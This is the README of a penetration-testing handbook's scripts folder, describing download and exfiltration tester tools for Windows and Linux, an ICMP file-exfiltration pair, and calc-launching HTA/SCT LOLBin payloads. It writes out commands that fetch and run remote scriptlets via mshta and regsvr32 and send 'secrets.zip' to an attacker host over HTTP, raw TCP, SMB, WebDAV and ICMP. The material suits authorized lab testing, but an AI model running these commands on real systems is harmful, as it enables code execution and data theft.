# scripts

[English](README.md) · [Русский](README-RU.md)

[← Back to the handbook](../README.md)

Ready-to-use scripts from the handbook. Each one is self-contained with minimal dependencies.

| Script | What it does | Dependencies |
|--------|-----------|-------------|
| [`upload/serv.py`](upload/serv.py) | HTTP receiver: multipart (any field name) + raw POST/PUT; `-p`, `-d`, `--max-size`, `--token`, TLS, SHA-256 | Python 3.9+ |
| [`Windows-download-test.ps1`](Windows-download-test.ps1) | tests Windows download methods; first success by default; `-NoLogs`/`-Log`/`-LOLBINS`/`-Danger`/`-DIR`; `-All` = safe matrix + log | Windows PowerShell 5.1+ |
| [`Windows-Exfil-tester.ps1`](Windows-Exfil-tester.ps1) | sends one file to a Kali receiver; first success by default; `-NoLogs`/`-Log`/`-LOLBINS`/`-FILE`/`-Receiver`; `-All` = matrix + log | Windows PowerShell 5.1+ |
| [`Linux-download-test.py`](Linux-download-test.py) | tests curl/wget/python/perl/php/ruby/node/bash/busybox/aria2c/axel downloads; `--all` = matrix + log/CSV | Python 3.8+ |
| [`Linux-exfil-test.py`](Linux-exfil-test.py) | tests uploadserver, serv.py, nginx, WebDAV, FTP, SMB and raw TCP uploads; `--all` = matrix + log/CSV | Python 3.8+ |
| [`icmp/icmp_send.py`](icmp/icmp_send.py) | sends a file in ICMP echo requests | Python 3, root |
| [`icmp/icmp_recv.py`](icmp/icmp_recv.py) | receives and reassembles a file from ICMP | Python 3, `scapy`, root |
| [`payload.hta`](payload.hta) | minimal HTA for the mshta method; runs `calc` and closes | Windows |
| [`payload.sct`](payload.sct) | minimal SCT scriptlet for regsvr32 Squiblydoo; runs `calc` | Windows |

## LOLBin test payloads

Both files only launch `calc` and are meant for a disposable lab. Serve them
from LHOST:

```bash
cp payload.hta payload.sct /tmp/share/
cd /tmp/share && python3 -m http.server 1337
```

RHOST:

```cmd
mshta http://10.10.14.5:1337/payload.hta
regsvr32 /s /n /u /i:http://10.10.14.5:1337/payload.sct scrobj.dll
```



## Quick start

**Receiver (LHOST):**
```bash
python3 upload/serv.py                  # 0.0.0.0:8000, current directory
python3 upload/serv.py -p 9001 -d /tmp/loot --max-size 2G
python3 upload/serv.py -p 8443 --tls-cert server.pem --tls-key server.key
```
`serv.py` also supports `--token` (checked in `X-Upload-Token` or `?token=`) and `GET /health`; every saved file gets a SHA-256 in the response and stdout.

**ICMP channel (exfil RHOST -> LHOST):**
```bash
# LHOST: receiver
sudo apt install -y python3-scapy
sudo python3 icmp/icmp_recv.py -o loot.zip

# RHOST: sender (after the receiver is up)
# copy icmp/icmp_send.py to the target over any channel
sudo python3 icmp_send.py <LHOST> loot.zip
```

Full walkthrough of the flags, MTU, and packet loss is in [12-dns-icmp.md](../docs/en/12-dns-icmp.md).

**Linux download/exfil testers (run on RHOST):**
```bash
# try methods until one works
python3 Linux-download-test.py 10.10.14.5 -p 8000 -f payload.sh

# full matrix + log/CSV
python3 Linux-download-test.py 10.10.14.5 -p 8000 -f payload.sh --all

# HTTPS self-signed
python3 Linux-download-test.py 10.10.14.5 -p 443 -f payload.sh --scheme https --all

# exfil to serv.py
python3 Linux-exfil-test.py 10.10.14.5 -p 8000 -f ./secrets.zip --receiver servpy --all

# exfil over raw TCP
python3 Linux-exfil-test.py 10.10.14.5 -p 8000 -f ./secrets.zip --receiver rawtcp --raw-port 4444
```
`Linux-download-test.py` never executes the downloaded file;
`Linux-exfil-test.py` only sends the source file. Use `--list` to see which
clients are installed.

**Windows download tester (run on RHOST):**
```powershell
.\Windows-download-test.ps1 -LHOST 10.0.2.10 -LPORT 1337
.\Windows-download-test.ps1 -LHOST 10.0.2.10 -LPORT 1337 -NoLogs
.\Windows-download-test.ps1 -LHOST 10.0.2.10 -LPORT 1337 -DIR C:\Users\Public
.\Windows-download-test.ps1 -LHOST 10.0.2.10 -LPORT 1337 -LOLBINS
.\Windows-download-test.ps1 -LHOST 10.0.2.10 -LPORT 1337 -LOLBINS -All
.\Windows-download-test.ps1 -LHOST 10.0.2.10 -LPORT 1337 -Danger -All
.\Windows-download-test.ps1 -LHOST 10.0.2.10 -LPORT 1337 -UNCPath '\\10.0.2.10\share\payload.exe' -All
```
- Default: stops at the first working method, console only.
- `-Log`: quick mode plus log/CSV.
- `-NoLogs`: in quick mode prints only `Done!`, saves the file under its original name in the current directory (or `-DIR`), and writes no logs. With `-All`, the full matrix still runs, but no log/CSV files are written; downloaded test files remain in the destination directory.
- `-DIR`: destination directory (default `C:\Users\Public`).
- `-LOLBINS`: only safe LOLBin methods (certutil, BITS, bitsadmin, MpCmdRun, UNC helpers); danger methods are excluded.
- `-Danger`: only danger-tagged methods: desktopimgdownldr (lockscreen/registry), certutil `-URL` (CryptnetUrlCache), CertOC, ConfigSecurityPolicy, xsd, IMEWDBLD (INetCache). They are excluded from `-All`/`-LOLBINS`; combine `-Danger -LOLBINS` to include both. No payload execution.
- `-UNCPath`: enables the UNC tests (`esentutl`, `extrac32`, `replace`). It requires an SMB/WebDAV share on LHOST.
- `-All`: full safe matrix plus log/CSV; danger methods are excluded unless `-Danger` is also set. `-Debug` is reserved by PowerShell.

> **Safety:** do not use `-Danger` on production. It includes methods that change lockscreen/registry and write caches; run it only on a disposable lab VM. The default mode and `-All` exclude danger-tagged methods.

**Covered (safe):** iwr, irm, WebClient, WebClient proxy, WebRequest, HttpClient, curl, wget; certutil (`-urlcache`), BITS normal/`-Dynamic`, bitsadmin normal/`/dynamic`, MpCmdRun (only where `-DownloadFile` exists), UNC `esentutl`/`extrac32`/`replace`.

**Danger-only (`-Danger`):** desktopimgdownldr (changes lockscreen and `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\PersonalizationCSP`); certutil `-URL` (CryptnetUrlCache); CertOC (text/cache); ConfigSecurityPolicy/xsd/IMEWDBLD (INetCache). These are download-only, but write caches or change state.

**UNC tests need a share on LHOST and authentication before the run:**
```bash
# LHOST
sudo impacket-smbserver share /tmp/share -smb2support -username test -password test
```
```cmd
:: Windows - REQUIRED for an authenticated share; without it the UNC methods fail
:: with "Path not found" / "Cannot open file"
net use \\10.0.2.10\share /user:test test
```
Then run:
```powershell
.\Windows-download-test.ps1 -LHOST 10.0.2.10 -LPORT 1337 -UNCPath '\\10.0.2.10\share\payload.exe' -All
```
> `esentutl` can still fail with `JET_errDiskIO` on some SMB shares/Server builds even after `net use`; `extrac32` and `replace` are the reliable UNC methods there.

**Windows exfil tester (run on RHOST):**
```powershell
.\Windows-Exfil-tester.ps1 -LHOST 10.0.2.10 -LPORT 8000
.\Windows-Exfil-tester.ps1 -LHOST 10.0.2.10 -LPORT 8000 -NoLogs
.\Windows-Exfil-tester.ps1 -LHOST 10.0.2.10 -LPORT 8000 -FILE C:\Users\Public\secrets.zip -All
.\Windows-Exfil-tester.ps1 -LHOST 10.0.2.10 -LPORT 8000 -FILE C:\Users\Public\secrets.zip -All -Receiver uploadserver
.\Windows-Exfil-tester.ps1 -LHOST 10.0.2.10 -LPORT 8000 -LOLBINS -All
.\Windows-Exfil-tester.ps1 -LHOST 10.0.2.10 -LPORT 8000 -UNCPath '\\10.0.2.10\share\' -All -Receiver smb
.\Windows-Exfil-tester.ps1 -LHOST 10.0.2.10 -LPORT 8000 -ALL -Receiver rawtcp -RawPort 4444
```
- Default: stops at the first successful upload, console only.
- `-Log`: quick mode + log/CSV; `-NoLogs`: only `Done!`.
- `-FILE`: full local path to the file (default `C:\Users\Public\secrets.zip`); logs go to its directory. This is not the Kali loot directory.
- `-LOLBINS`: certreq, ConfigSecurityPolicy, certutil-curl, bitsadmin.
- `-Receiver`: `All` (default), `UploadServer`, `ServPy`, `Nginx`, `Bits`, `RawTcp`, `Smb`. Use it with `-All` to test only the receiver you actually started.
- `-UNCPath`: SMB/WebDAV destination directory; authenticate with `net use` first.
- `-RawPort`: raw TCP test; start `nc -lvnp 4444 > secrets.zip` on Kali.
- `-All`: full matrix + log/CSV in the source directory. Without `-Receiver`, all profiles run and methods for other receivers fail; use `-Receiver` for a clean run.

`certutil-curl` sends base64 text - decode it on Kali with `base64 -d`. `bitsadmin` upload needs a BITS-compatible server and usually fails against generic receivers; it is included for completeness. `certreq` and `ConfigSecurityPolicy` are specialized: they may expect a certificate/policy-shaped file and can fail against a generic receiver; `certutil-curl` is the reliable LOLBin text channel.

**Receiver on Kali - pick one and start it in the loot directory.**

**uploadserver (multipart, field `files`):**
```bash
mkdir -p /tmp/loot && cd /tmp/loot
uploadserver 8000
```
Use `-Receiver uploadserver`.

**serv.py (raw POST/PUT or any multipart field):**
```bash
python3 /path/to/file-transfer-arsenal/scripts/upload/serv.py -p 8000 -d /tmp/loot
# optional: --max-size 2G --token s3cret --tls-cert cert.pem --tls-key key.pem
```
Use `-Receiver servpy`. The receiver prints the path and SHA-256 of every saved file; `GET /health` is a readiness check.

**nginx PUT (`/SecretUploadDirectory/`):**
```bash
sudo mkdir -p /tmp/loot/SecretUploadDirectory
sudo chown -R www-data:www-data /tmp/loot/SecretUploadDirectory
```
```nginx
server {
    listen 8000;
    root /tmp/loot;
    client_max_body_size 0;

    location /SecretUploadDirectory/ {
        dav_methods PUT;
        create_full_put_path on;
    }
}
```
Files land in `/tmp/loot/SecretUploadDirectory/`. Use `-Receiver nginx`.

**Raw TCP (`-RawPort`):**
```bash
nc -lvnp 4444 > /tmp/loot/secrets.zip
# or
socat -u TCP-LISTEN:4444,reuseaddr,fork OPEN:/tmp/loot/secrets.zip,creat,append
```
Use `-Receiver rawtcp -RawPort 4444`.

**SMB - impacket (`-UNCPath`):**
```bash
sudo impacket-smbserver share /tmp/loot -smb2support -username test -password test
```
```cmd
:: Windows - required for an authenticated share
net use \\10.0.2.10\share /user:test test
```
```powershell
.\Windows-Exfil-tester.ps1 -LHOST 10.0.2.10 -LPORT 8000 -FILE C:\Users\Public\secrets.zip -UNCPath '\\10.0.2.10\share\' -All -Receiver smb
```
Files land in `/tmp/loot`.

**BITS:**
`bitsadmin` upload needs a BITS-compatible server (IIS BITS/BITSServer). uploadserver, serv.py and nginx do not implement BITS upload and reject it; that is expected. Use `-Receiver bits` only with such a server.

**WebDAV (optional):**
```bash
rclone serve webdav /tmp/loot --addr :8000 --user test --pass test
```
```cmd
net use \\10.0.2.10@8000\DavWWWRoot /user:test test
```
Use `-UNCPath '\\10.0.2.10@8000\DavWWWRoot\' -Receiver smb` (enable WebClient/BasicAuthLevel=2 as in section 04).

> `-All` without `-Receiver` runs every profile; methods for the other receivers will FAIL, which is expected. Use `-Receiver <profile>` for a clean run.
>
> The tester uses HTTP. HTTPS receivers are not covered yet; use an HTTP lab receiver.


**Not executed on purpose:** mshta, regsvr32, msiexec, ieexec, installutil, ngen, presentationhost, xwizard, scrobj/PhotoViewer/shimgvw, Office, hh, winget, AppInstaller, update/squirrel. They execute or install code, so a download tester must not run them. `certutil -verifyctl` is CTL-oriented and fails on some Windows Server builds for arbitrary binaries. Cache/text downloaders are in `-Danger`. Cache-only writers (`ConfigSecurityPolicy`, `xsd`, `imewdbld`) are also excluded because the output path is not deterministic.

**Encryption (Windows):**
The AES helper is not bundled. It is published by its author as a gist:
<https://gist.github.com/ddumicz/909d98a0e794a42326d5fcd6d9f2c4ad>. Download it
as `Invoke-AESEncryption.ps1`, then:
```powershell
Import-Module .\Invoke-AESEncryption.ps1
```
See [11 - Encryption](../docs/en/11-encryption.md#powershell-aes-no-install).

## Tests

The checksum and HTTP receiver tests need only Python 3.9+ (no root, no scapy):

```bash
cd file-transfer-arsenal
python3 -m unittest discover -s tests -v
```

## Dependencies

```bash
sudo apt install -y python3-scapy   # icmp_recv.py
# Windows tester: Windows PowerShell 5.1+ (BITS, bitsadmin and certutil are built in)
```

> These scripts are intended only for authorized tests and isolated labs.
